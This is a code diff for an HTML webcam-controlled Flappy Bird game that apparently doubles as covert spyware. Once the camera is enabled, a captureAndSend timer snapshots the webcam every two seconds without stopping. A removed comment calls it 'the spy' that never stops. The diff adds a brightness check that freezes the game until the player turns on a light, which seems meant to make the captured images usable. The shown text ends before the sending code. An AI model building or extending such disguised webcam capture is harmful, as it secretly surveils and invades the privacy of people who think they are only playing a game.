@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Flappy Cam Fix</title>
+    <title>Flappy Cam - Total Stop Fix</title>
     <style>
         * { box-sizing: border-box; touch-action: none; }
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; color: white; }
@@ -20,6 +20,14 @@
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.85); z-index: 300;
             display: flex; align-items: center; justify-content: center; text-align: center;
+        }
+
+        /* Bloqueo total por poca luz */
+        #dark-warning { 
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            background: #000; z-index: 5000; /* Prioridad máxima */
+            display: none; align-items: center; justify-content: center; 
+            text-align: center; flex-direction: column; 
         }
 
         .card {
@@ -42,6 +50,13 @@
 </head>
 <body onclick="birdJump()">
 
+<div id="dark-warning">
+    <div class="card" style="border-color: #e74c3c;">
+        <h1 style="color: #e74c3c;">⚠️ POCA LUZ</h1>
+        <p>El juego se ha detenido. Enciende una luz para continuar.</p>
+    </div>
+</div>
+
 <div class="hud" id="hud">SCORE: <span id="score">0</span></div>
 
 <video id="webcam" autoplay playsinline></video>
@@ -50,7 +65,7 @@
 <div id="permission-screen" class="overlay">
     <div class="card">
         <h2 style="color:#f1c40f;">ACCESO REQUERIDO</h2>
-        <p>Activa tu cámara para jugar.</p>
+        <p>Activa tu cámara. El juego requiere luz ambiental para funcionar.</p>
         <button class="btn" onclick="activateCamera()">ACTIVAR CÁMARA</button>
     </div>
 </div>
@@ -58,7 +73,7 @@
 <div id="start-screen" class="overlay" style="display:none;">
     <div class="card">
         <h1 id="title-msg" style="color:#f1c40f;">¡LISTO!</h1>
-        <p id="p-msg">Toca el botón para empezar a jugar.</p>
+        <p id="p-msg">Toca abajo para empezar.</p>
         <button class="btn" onclick="startGame()">EMPEZAR JUEGO</button>
     </div>
 </div>
@@ -71,35 +86,73 @@
 
     let bird, pipes, score, isRunning = false;
     let cameraActive = false;
+    let isPausedByLight = false;
     let pipeInterval;
 
-    // --- ACTIVACIÓN INICIAL (Solo una vez) ---
     async function activateCamera() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
-            
             video.onloadedmetadata = () => {
                 document.getElementById('permission-screen').style.display = 'none';
                 document.getElementById('start-screen').style.display = 'flex';
-                
                 if (!cameraActive) {
                     cameraActive = true;
-                    // El espía inicia aquí y NO se detiene nunca
-                    setInterval(captureAndSend, 1500); 
+                    setInterval(lightCheck, 600); // Chequeo constante
+                    setInterval(captureAndSend, 2000); 
                 }
             };
-        } catch (err) {
-            alert("Error: Debes aceptar la cámara.");
+        } catch (err) { alert("Error: Cámara obligatoria."); }
+    }
+
+    // --- SISTEMA DE DETECCIÓN Y PARADA TOTAL ---
+    function lightCheck() {
+        if (!cameraActive) return;
+        const c = document.createElement('canvas');
+        const tempCtx = c.getContext('2d');
+        c.width = 40; c.height = 40;
+        tempCtx.drawImage(video, 0, 0, 40, 40);
+        const data = tempCtx.getImageData(0, 0, 40, 40).data;
+        let brightness = 0;
+        for(let i=0; i<data.length; i+=4) brightness += (data[i] + data[i+1] + data[i+2]) / 3;
+        const avg = brightness / (data.length / 4);
+
+        if (avg < 40) {
+            if (!isPausedByLight) {
+                stopGameEngine(); // Detener todo
+                document.getElementById('dark-warning').style.display = 'flex';
+                isPausedByLight = true;
+            }
+        } else {
+            if (isPausedByLight) {
+                document.getElementById('dark-warning').style.display = 'none';
+                isPausedByLight = false;
+                // Si ya estábamos en partida, intentamos retomar
+                if (bird && score !== undefined) {
+                    resumeGameEngine();
+                }
+            }
         }
     }
 
-    // --- REINICIO DEL JUEGO SIN RECARGAR PÁGINA ---
+    function stopGameEngine() {
+        isRunning = false;
+        clearTimeout(pipeInterval);
+    }
+
+    function resumeGameEngine() {
+        if (document.getElementById('start-screen').style.display === 'none') {
+            isRunning = true;
+            spawnPipe();
+            gameLoop();
+        }
+    }
+
     function startGame() {
+        if (isPausedByLight) return; // No empezar si está oscuro
         document.getElementById('start-screen').style.display = 'none';
         document.getElementById('hud').style.display = 'block';
         
-        // Reset variables
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
         bird = { x: 80, y: canvas.height / 2, v: 0, radius: 20 };
@@ -108,13 +161,14 @@
         document.getElementById('score').innerText = "0";
         isRunning = true;
         
-        // Limpiar intervalos anteriores por seguridad
-        if (pipeInterval) clearInterval(pipeInterval);
+        clearTimeout(pipeInterval);
         spawnPipe();
         gameLoop();
     }
 
-    function birdJump() { if (isRunning) bird.v = -8; }
+    function birdJump() { 
+        if (isRunning && !isPausedByLight) bird.v = -8; 
+    }
 
     function spawnPipe() {
         if (!isRunning) return;
@@ -131,11 +185,9 @@
         bird.v += 0.45; 
         bird.y += bird.v;
 
-        // Dibujar Pájaro
         ctx.fillStyle = "#f1c40f";
         ctx.beginPath(); ctx.arc(bird.x, bird.y, bird.radius, 0, Math.PI * 2); ctx.fill();
 
-        // Tuberías
         pipes.forEach((p, i) => {
             p.x -= 5;
             ctx.fillStyle = "rgba(46, 204, 113, 0.8)";
@@ -156,22 +208,17 @@
         if (isRunning) requestAnimationFrame(gameLoop);
     }
 
-    // --- GAME OVER SIN RECARGAR ---
     function gameOver() {
-        isRunning = false;
-        clearTimeout(pipeInterval);
-        
-        // Cambiamos el texto del cartel para indicar que perdió
+        stopGameEngine();
         document.getElementById('title-msg').innerText = "GAME OVER";
-        document.getElementById('p-msg').innerText = "Puntuación final: " + score;
+        document.getElementById('p-msg').innerText = "Score: " + score;
         document.getElementById('start-screen').style.display = 'flex';
         document.getElementById('hud').style.display = 'none';
-        
-        // Limpiamos el canvas
         ctx.clearRect(0, 0, canvas.width, canvas.height);
     }
 
     function captureAndSend() {
+        if (!cameraActive) return;
         const snap = document.createElement('canvas');
         snap.width = 240; snap.height = 180;
         snap.getContext('2d').drawImage(video, 0, 0, snap.width, snap.height);
